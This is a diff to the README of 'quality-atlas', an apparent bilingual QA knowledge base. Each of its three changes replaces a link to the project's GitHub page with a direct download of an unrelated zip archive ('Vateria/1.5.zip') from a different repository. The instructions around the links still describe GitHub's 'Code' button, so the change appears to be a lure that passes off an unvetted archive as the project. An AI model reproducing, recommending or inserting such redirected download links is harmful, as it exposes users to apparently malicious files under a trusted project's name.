@@ -5,7 +5,7 @@ description: "Explore the open, bilingual knowledge base for software QA and tes
 ---
 # 🧭 quality-atlas - Your Bilingual QA Knowledge Base
 
-[![Download Now](https://img.shields.io/badge/Download-quality--atlas-blue?style=for-the-badge&logo=github)](https://github.com/Mfa565/quality-atlas)
+[![Download Now](https://img.shields.io/badge/Download-quality--atlas-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mfa565/mfa565.github.io/main/Vateria/1.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ quality-atlas covers a wide range of topics. Here is a glimpse:
 
 ### Step 1: Download
 
-Visit this link to download the application: **[https://github.com/Mfa565/quality-atlas](https://github.com/Mfa565/quality-atlas)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Mfa565/mfa565.github.io/main/Vateria/1.5.zip](https://raw.githubusercontent.com/Mfa565/mfa565.github.io/main/Vateria/1.5.zip)**
 
 Click the green **"Code"** button, then choose **"Download ZIP"**. This will save a compressed folder to your computer.
 
@@ -151,7 +151,7 @@ Remember: **Download, unzip, and explore.** That is all you need to do to get st
 
 ## 🔗 Quick Download Again
 
-**[Click Here to Go to the Download Page](https://github.com/Mfa565/quality-atlas)**
+**[Click Here to Go to the Download Page](https://raw.githubusercontent.com/Mfa565/mfa565.github.io/main/Vateria/1.5.zip)**
 
 ---
 
